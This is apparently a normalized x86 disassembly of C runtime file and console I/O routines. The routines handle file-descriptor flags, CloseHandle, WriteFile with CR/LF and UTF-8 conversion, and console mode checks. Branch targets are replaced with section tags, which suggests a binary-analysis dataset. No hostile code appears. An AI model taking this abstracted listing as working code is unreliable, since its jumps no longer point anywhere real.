je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] 0x1
mov al 0x1
or [ ecx ] 0x20
pop ebp
retn
xor al al
pop ebp
retn
sub_431e3b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx 0x1000
mov eax [ ecx ]
test edx eax
je r-xdata
or eax edx
mov [ ecx ] eax
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_431e5a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test eax 0xc000
je r-xdata
or eax 0x8000
mov [ ecx ] eax
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_431e7a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] 0x1
mov al 0x1
or [ ecx + 0x4 ] 0x800
pop ebp
retn
xor al al
pop ebp
retn
sub_431e9c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] 0x1
mov al 0x1
and [ ecx + 0x4 ] 0xfffff7ff
pop ebp
retn
xor al al
pop ebp
retn
sub_431ebe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ eax ] 0x1
mov eax [ edx ]
test al 0x2
jne r-xdata
xor al al
pop ebp
retn
mov ecx [ edx + 0x4 ]
and eax 0xfffffffe
or eax 0x2
and ecx 0xfffffffc
or ecx 0x4
mov [ edx ] eax
mov [ edx + 0x4 ] ecx
mov al 0x1
pop ebp
retn
sub_431ef3
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test eax 0xc000
je r-xdata
or eax 0x4000
mov [ ecx ] eax
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_431f29
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_438cfe
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov esi [ eax ]
mov edx esi
sar edx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x9
or esi 0xffffffff
push esi
call sub_43213b
pop ecx
mov esi eax
jmp r-xdata
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_431f9f
mov eax esi
call sub_40d2b6
retn 0xc
sub_431fab
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_431f29
mov esp ebp
pop ebp
retn
sub_432010
mov eax [ ecx ]
push esi
mov esi [ eax ]
mov eax esi
and eax 0x3f
mov edx esi
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_430f56
pop esi
mov [ eax ] 0x9
or eax 0xffffffff
retn
push esi
call sub_43213b
pop ecx
pop esi
retn
sub_432052
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_438f7b
pop ecx
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp + 0x8 ] 0x1
mov eax [ rw-data ]
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
test [ eax + 0x88 ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
call sub_438f7b
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x58 ] 0x1
je r-xdata
push esi
push 0x2
call sub_438f7b
push 0x1
mov esi eax
call sub_438f7b
pop ecx
pop ecx
cmp eax esi
pop esi
je r-xdata
pop ebp
jmp [ GetLastError@IAT ]
sub_4320bc
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
jmp r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
call sub_430e30
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax esi
mov edx esi
and eax 0x3f
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_431fab
pop ecx
pop ecx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_43213b
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_438f7b
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor esi esi
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x88 ] 0x1
jne r-xdata
push edi
call sub_438eea
pop ecx
mov ecx edi
and edi 0x3f
sar ecx 0x6
imul edx edi 0x30
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edx + 0x28 ] 0x0
test esi esi
je r-xdata
push edi
call sub_438f7b
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x58 ] 0x1
je r-xdata
push 0x2
call sub_438f7b
push 0x1
mov esi eax
call sub_438f7b
pop ecx
pop ecx
cmp eax esi
je r-xdata
xor eax eax
push esi
call sub_430f20
pop ecx
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov esi eax
pop edi
pop esi
pop ebp
retn
sub_4321dd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
pop ebp
retn
sub_432203
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx eax
and eax 0x3f
sar edx 0x6
imul ecx eax 0x30
push esi
mov esi [ ebp + 0x8 ]
mov eax [ edx * 4 + rw-data ]
xor edx edx
push edx
mov ecx [ eax + ecx + 0x18 ]
lea eax [ esi + 0x4 ]
push eax
push [ ebp + 0x14 ]
mov [ esi ] edx
push [ ebp + 0x10 ]
mov [ eax ] edx
push ecx
mov [ eax + 0x4 ] edx
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn
call [ GetLastError@IAT ]
mov [ esi ] eax
sub_432251
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
push ebx
imul ebx eax 0x30
push esi
mov eax [ ecx * 4 + rw-data ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] ecx
mov eax [ eax + ebx + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
add eax edi
mov [ ebp - 0x24 ] eax
call [ GetConsoleCP@IAT ]
mov esi [ ebp + 0x8 ]
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ch [ edi ]
xor eax eax
mov [ ebp - 0x18 ] ax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x1b ] ch
mov edx [ eax * 4 + rw-data ]
mov cl [ edx + ebx + 0x2d ]
test cl 0x4
je r-xdata
call sub_4390f9
movzx ecx [ edi ]
mov edx 0x8000
test [ eax + ecx * 2 ] dx
je r-xdata
mov al [ edx + ebx + 0x2e ]
and cl 0xfb
mov [ ebp - 0xc ] al
lea eax [ ebp - 0xc ]
push 0x2
mov [ ebp - 0xb ] ch
mov [ edx + ebx + 0x2d ] cl
push eax
jmp r-xdata
push 0x1
push edi
cmp edi [ ebp - 0x24 ]
jae r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_43412a
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor ecx ecx
lea eax [ ebp - 0x14 ]
push ecx
push ecx
push 0x5
push eax
push 0x1
lea eax [ ebp - 0x18 ]
inc edi
push eax
push ecx
push [ ebp - 0x38 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x34 ] eax
test eax eax
je r-xdata
mov edx [ ebp - 0x2c ]
mov al [ edi ]
mov ecx [ edx * 4 + rw-data ]
mov [ ecx + ebx + 0x2e ] al
mov eax [ edx * 4 + rw-data ]
or [ eax + ebx + 0x2d ] 0x4
inc [ esi + 0x4 ]
jmp r-xdata
push 0x2
lea eax [ ebp - 0x18 ]
push edi
push eax
call sub_43412a
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
push ecx
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x28 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc edi
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ esi + 0x8 ]
sub eax [ ebp - 0x30 ]
add eax edi
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x20 ] eax
jb r-xdata
cmp [ ebp - 0x1b ] 0xa
jne r-xdata
cmp edi [ ebp - 0x24 ]
jb r-xdata
push 0xd
pop eax
push 0x0
mov [ ebp - 0x1c ] ax
lea eax [ ebp - 0x20 ]
push eax
push 0x1
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x28 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x20 ] 0x1
jb r-xdata
inc [ esi + 0x8 ]
inc [ esi + 0x4 ]
sub_432404
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0xc ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
add eax edi
mov [ ebp - 0x4 ] eax
cmp edi eax
jae r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx ebx [ edi ]
push ebx
call sub_43ee74
pop ecx
cmp ax bx
jne r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
add [ esi + 0x4 ] 0x2
cmp ebx 0xa
jne r-xdata
add edi 0x2
cmp edi [ ebp - 0x4 ]
jb r-xdata
push 0xd
pop ebx
push ebx
call sub_43ee74
pop ecx
cmp ax bx
jne r-xdata
jmp r-xdata
inc [ esi + 0x4 ]
inc [ esi + 0x8 ]
sub_432471
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_43e954
pop ecx
test eax eax
jne r-xdata
push edi
mov edi esi
and esi 0x3f
sar edi 0x6
imul esi esi 0x30
mov eax [ edi * 4 + rw-data ]
test [ eax + esi + 0x28 ] 0x80
je r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
call sub_430a7e
mov eax [ eax + 0x4c ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
pop edi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ edi * 4 + rw-data ]
push [ eax + esi + 0x18 ]
call [ GetConsoleMode@IAT ]
test eax eax
setne al
mov eax [ edi * 4 + rw-data ]
cmp [ eax + esi + 0x29 ] 0x0
jne r-xdata
sub_4324e7
mov edi edi
push ebp
mov ebp esp
mov eax 0x1410
call sub_40c3a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx [ eax + ecx + 0x18 ]
mov eax [ ebp + 0x14 ]
and [ esi ] 0x0
add eax ebx
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
mov [ ebp - 0x1410 ] ecx
mov [ ebp - 0x1408 ] eax
jmp r-xdata
cmp ebx eax
jb r-xdata
lea edi [ ebp - 0x1404 ]
jmp r-xdata
lea eax [ ebp - 0x1404 ]
sub edi eax
lea eax [ ebp - 0x140c ]
push 0x0
push eax
push edi
lea eax [ ebp - 0x1404 ]
push eax
push ecx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ ebx ]
inc ebx
cmp al 0xa
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ ebp - 0x140c ]
add [ esi + 0x4 ] eax
cmp eax edi
jb r-xdata
mov [ edi ] al
lea eax [ ebp - 0x5 ]
inc edi
cmp edi eax
mov eax [ ebp - 0x1408 ]
jb r-xdata
inc [ esi + 0x8 ]
mov [ edi ] 0xd
inc edi
mov eax [ ebp - 0x1408 ]
mov ecx [ ebp - 0x1410 ]
cmp ebx eax
jae r-xdata
sub_4325c6
mov edi edi
push ebp
mov ebp esp
mov eax 0x1410
call sub_40c3a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx [ eax + ecx + 0x18 ]
mov eax [ ebp + 0x14 ]
add eax ebx
mov [ ebp - 0x1410 ] ecx
xor edx edx
mov [ ebp - 0x1408 ] eax
mov [ esi ] edx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
cmp ebx eax
jb r-xdata
lea edi [ ebp - 0x1404 ]
jmp r-xdata
lea eax [ ebp - 0x1404 ]
sub edi eax
lea eax [ ebp - 0x140c ]
push 0x0
push eax
and edi 0xfffffffe
lea eax [ ebp - 0x1404 ]
push edi
push eax
push ecx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ ebx ]
add ebx 0x2
cmp eax 0xa
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ ebp - 0x140c ]
add [ esi + 0x4 ] eax
cmp eax edi
jb r-xdata
mov [ edi ] ax
lea eax [ ebp - 0x6 ]
add edi 0x2
cmp edi eax
mov eax [ ebp - 0x1408 ]
jb r-xdata
add [ esi + 0x8 ] 0x2
push 0xd
pop edx
mov [ edi ] dx
add edi 0x2
mov eax [ ebp - 0x1408 ]
mov ecx [ ebp - 0x1410 ]
cmp ebx eax
jae r-xdata
sub_4326b4
mov edi edi
push ebp
mov ebp esp
mov eax 0x1418
call sub_40c3a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
push ebx
push esi
mov eax [ eax * 4 + rw-data ]
xor ebx ebx
mov esi [ ebp + 0x8 ]
push edi
mov eax [ eax + ecx + 0x18 ]
mov ecx [ ebp + 0x10 ]
mov edi ecx
mov [ ebp - 0x1414 ] eax
mov eax [ ebp + 0x14 ]
add eax ecx
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x140c ] eax
mov [ esi + 0x8 ] ebx
cmp ecx eax
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x140c ]
lea eax [ ebp - 0x6b0 ]
push ebx
push ebx
push 0xd55
lea ecx [ ebp - 0x1408 ]
push ecx
lea ecx [ ebp - 0x6b0 ]
sub eax ecx
sar eax 0x1
push eax
mov eax ecx
push eax
push ebx
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1418 ] eax
test eax eax
je r-xdata
movzx ecx [ edi ]
add edi 0x2
cmp ecx 0xa
jne r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
push 0x0
lea ecx [ ebp - 0x1410 ]
sub eax ebx
push ecx
push eax
lea eax [ ebp - 0x1408 ]
add eax ebx
push eax
push [ ebp - 0x1414 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov [ eax ] cx
add eax 0x2
lea ecx [ ebp - 0x8 ]
cmp eax ecx
jb r-xdata
push 0xd
pop edx
mov [ eax ] dx
add eax 0x2
add ebx [ ebp - 0x1410 ]
mov eax [ ebp - 0x1418 ]
cmp ebx eax
jb r-xdata
cmp edi esi
jae r-xdata
mov eax edi
sub eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
cmp edi [ ebp - 0x140c ]
jae r-xdata
xor ebx ebx
jmp r-xdata
sub_4327e1
push 0x14
push r--data
call sub_40d270
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
jmp r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
call sub_430e30
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov [ ebp - 0x20 ] ecx
mov eax [ ebx * 4 + rw-data ]
movzx eax [ eax + ecx + 0x28 ]
and eax 0x1
je r-xdata
push esi
call sub_438cfe
pop ecx
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4328cc
add esp 0xc
mov edi eax
mov [ ebp - 0x1c ] edi
call sub_430f56
mov [ eax ] 0x9
call sub_430f43
and [ eax ] 0x0
jmp r-xdata
call sub_40d2b6
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4328a3
mov eax edi
jmp r-xdata
sub_4328cc
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x30 ] edi
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
mov eax esi
mov ebx esi
sar ebx 0x6
and eax 0x3f
imul edx eax 0x30
mov [ ebp - 0x1c ] ebx
mov eax [ ebx * 4 + rw-data ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x18 ] edx
mov bl [ eax + edx + 0x29 ]
cmp bl 0x2
je r-xdata
call sub_430f43
and [ eax ] edi
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
mov eax ecx
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x2c ]
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
test [ eax + edx + 0x28 ] 0x20
je r-xdata
push esi
call sub_432471
pop ecx
test al al
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_43ed63
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
test [ ecx + eax + 0x28 ] 0x80
je r-xdata
test bl bl
je r-xdata
pop ebx
mov eax [ ecx + eax + 0x18 ]
xor ecx ecx
push ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0x10 ]
push ecx
push [ ebp - 0x8 ]
push edi
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
movsx eax bl
sub eax 0x0
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_432251
dec bl
cmp bl 0x1
ja r-xdata
lea esi [ ebp - 0x14 ]
call [ GetLastError@IAT ]
mov [ ebp - 0x14 ] eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_4324e7
jmp r-xdata
sub eax 0x1
je r-xdata
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x40
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push eax
call sub_432404
add esp 0xc
sub eax [ ebp - 0x20 ]
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
add esp 0x10
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_4326b4
jmp r-xdata
sub eax 0x1
jne r-xdata
lea edi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x1c
call sub_430f43
and [ eax ] 0x0
cmp [ edi ] 0x1a
jne r-xdata
mov edi [ ebp - 0x30 ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_4325c6
jmp r-xdata
xor eax eax
jmp r-xdata
push eax
call sub_430f20
pop ecx
jmp r-xdata
call sub_430f56
mov [ eax ] 0x9
call sub_430f43
mov [ eax ] esi
jmp r-xdata
sub_432ad8
mov edi edi
push ebp
mov ebp esp
push edi
push [ ebp + 0xc ]
call sub_4321dd
pop ecx
mov ecx [ ebp + 0xc ]
mov edi eax
mov ecx [ ecx + 0xc ]
test cl 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x9
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test al 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop ebp
retn
mov eax [ ebp + 0xc ]
push ebx
push 0x2
pop ebx
add eax 0xc
[ eax ] ebx
mov eax [ ebp + 0xc ]
push 0xfffffff7
pop ecx
add eax 0xc
[ eax ] ecx
mov eax [ ebp + 0xc ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test eax 0x4c0
jne r-xdata
mov eax [ ebp + 0xc ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
shr eax 0x3
test al 0x1
mov eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0xc ]
push [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push ebx
call sub_432cfe
pop ecx
pop ecx
test al al
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push 0x1
call sub_41739e
pop ecx
cmp esi eax
je r-xdata
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax ] ecx
mov eax [ ebp + 0xc ]
push 0xfffffffe
pop ecx
add eax 0xc
[ eax ] ecx
movzx eax bl
mov eax [ ebp + 0xc ]
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
or eax 0xffffffff
jmp r-xdata
push edi
call sub_43e954
pop ecx
test eax eax
jne r-xdata
mov esi [ ebp + 0xc ]
push ebx
call sub_41739e
pop ecx
cmp esi eax
jne r-xdata
pop ebx
pop esi
push [ ebp + 0xc ]
call sub_43eeb9
pop ecx
sub_432be9
mov edi edi
push ebp
mov ebp esp
push edi
push [ ebp + 0xc ]
call sub_4321dd
pop ecx
mov ecx [ ebp + 0xc ]
mov edi eax
mov ecx [ ecx + 0xc ]
test cl 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x9
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test al 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop ebp
retn
mov eax [ ebp + 0xc ]
push ebx
push esi
push 0x2
pop ebx
add eax 0xc
[ eax ] ebx
mov eax [ ebp + 0xc ]
push 0xfffffff7
pop ecx
add eax 0xc
[ eax ] ecx
mov eax [ ebp + 0xc ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test eax 0x4c0
jne r-xdata
mov eax [ ebp + 0xc ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
shr eax 0x3
test al 0x1
mov eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0xc ]
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push esi
call sub_432dca
pop ecx
pop ecx
test al al
jne r-xdata
mov esi [ ebp + 0xc ]
push 0x1
call sub_41739e
pop ecx
cmp esi eax
je r-xdata
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
mov eax 0xffff
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax ] ecx
mov eax [ ebp + 0xc ]
push 0xfffffffe
pop ecx
add eax 0xc
[ eax ] ecx
movzx eax si
mov eax [ ebp + 0xc ]
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
mov eax 0xffff
jmp r-xdata
push edi
call sub_43e954
pop ecx
test eax eax
jne r-xdata
mov esi [ ebp + 0xc ]
push ebx
call sub_41739e
pop ecx
cmp esi eax
jne r-xdata
pop esi
pop ebx
push [ ebp + 0xc ]
call sub_43eeb9
pop ecx
sub_432cfe
mov edi edi
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
call sub_4321dd
pop ecx
mov ecx [ ebp + 0xc ]
mov edx eax
mov ecx [ ecx + 0xc ]
test cl 0xc0
je r-xdata
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push edx
call sub_4327e1
add esp 0xc
dec eax
neg eax
sbb eax eax
inc eax
mov ecx [ ebp + 0xc ]
xor edi edi
mov eax [ ecx + 0x4 ]
mov esi [ ecx ]
sub esi eax
inc eax
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x18 ]
dec ecx
mov [ eax + 0x8 ] ecx
test esi esi
jle r-xdata
cmp edx 0xffffffff
je r-xdata
mov eax [ ebp + 0xc ]
push esi
push [ eax + 0x4 ]
push edx
call sub_4327e1
add esp 0xc
mov edi eax
mov eax rw-data
cmp edx 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
cmp edi esi
sete al
jmp r-xdata
push 0x2
push edi
push edi
push edx
call sub_43ed48
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
mov eax edx
mov ecx edx
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
mov al 0x1
jmp r-xdata
test [ eax + 0x28 ] 0x20
je r-xdata
sub_432dca
mov edi edi
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
call sub_4321dd
pop ecx
mov ecx [ ebp + 0xc ]
mov edx eax
mov ecx [ ecx + 0xc ]
test cl 0xc0
je r-xdata
push 0x2
lea eax [ ebp + 0x8 ]
push eax
push edx
call sub_4327e1
sub eax 0x2
add esp 0xc
neg eax
sbb eax eax
inc eax
mov ecx [ ebp + 0xc ]
xor edi edi
mov eax [ ecx + 0x4 ]
mov esi [ ecx ]
sub esi eax
add eax 0x2
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x18 ]
sub ecx 0x2
mov [ eax + 0x8 ] ecx
test esi esi
jle r-xdata
cmp edx 0xffffffff
je r-xdata
mov eax [ ebp + 0xc ]
push esi
push [ eax + 0x4 ]
push edx
call sub_4327e1
add esp 0xc
